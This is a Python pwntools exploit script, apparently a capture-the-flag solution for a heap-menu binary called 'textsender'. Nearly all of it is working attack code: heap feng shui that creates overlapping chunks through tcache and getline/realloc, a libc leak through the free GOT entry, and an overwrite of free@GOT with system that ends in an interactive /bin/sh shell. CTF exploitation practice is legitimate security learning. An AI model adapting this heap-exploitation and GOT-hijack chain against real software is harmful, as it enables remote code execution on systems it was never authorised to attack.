#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host chals.sekai.team --port 4000 textsender
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('textsender')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'chals.sekai.team'
port = int(args.PORT or 4000)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
br *0x401608
br getline
br *getdelim + 451
c
'''.format(**locals())

def printx(**kwargs):
    for k,v in kwargs.items():
        log.info(f"{k} : 0x{v:x}")

def cmd(i):
    io.sendlineafter(b"> ", str(i).encode())

def prompt(m):
    io.sendlineafter(b": ",m)

def prompti(i):
    prompt(str(i).encode())

def set_sender(name):
    cmd(1)
    prompt(name)

def add_message(receiver,message):
    cmd(2)
    prompt(receiver)
    prompt(message)

def edit_message(name,message,fake=False):
    cmd(3)
    prompt(name)
    if not fake:
        prompt(message)

def fake_edit(name):
    edit_message(name,b"",fake=True)

def print_all():
    cmd(4)
    ls = []
    l =io.recvline()
    while(l!=b'------- MENU -------\n'):
        ls.append(l)
        l = io.recvline()
    return ls

def send_all():
    cmd(5)

def quit():
    cmd(6)

def empty_tcache(n=7):
    for i in range(n):
        add_message(b"tcache_name"*4,b"tcache_content"*4)

def empty_unsorted():
    for i in range(3):
        add_message(f"unsorted_name{i}".encode()*4,f"unsorted_content{i}".encode()*4)

def fill_entries():
    empty_tcache()
    empty_unsorted()

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x3fd000)
# RUNPATH:  b'.'
libc = exe.libc
#context.terminal = ['terminator','--new-tab','-x']

io = start()

# heap feng shui
# the goal is overlapping the top chunk with a chunk containing name & content pointers
empty_tcache()
add_message(b"a",b"b") # -> chunk U (0x200), it will go into unsorted bin once freed
set_sender(b"boop") # chunk S
send_all()
empty_tcache(n=6) # only chunk S left in 0x80 tcache bin (will be used+extended by getline)
fake_edit(b"Sender: "*128) # getline (realloc) will extend S beyond tcache range, it will then be consolidated with U and the top chunk when subsequently freed
add_message(b"empty",b"bins") # empty heap bins
fake_edit(b"a"*(0x2a0-8)+p64(0x20|1)+b"Sender: \x00"*512) # reforge chunk S with size 0x20
send_all() # overlapping chunks since S is freed and is also part of the top chunk
empty_tcache(n=6) # only S left in 0x20 tcache bin
add_message(b"victim",b"victim") # uses chunk S to store name and content pointers

# libc leak + got overwrite
# (replace name and content pointers of our victim message by got entries)
fake_edit(b"a"*(0x2a0-8) + p64(0x20|1) + p64(exe.got.free) * 2)
drafts = print_all()
leak = drafts[7].split(b") ")[1][:6]
free_addr = unpack(leak,'all')
libc.address = free_addr - libc.sym.free
printx(free=free_addr)
printx(libc=libc.address)
edit_message(leak+b"\x00",p64(libc.sym.system))
fake_edit(b"/bin/sh\x00")
io.interactive()

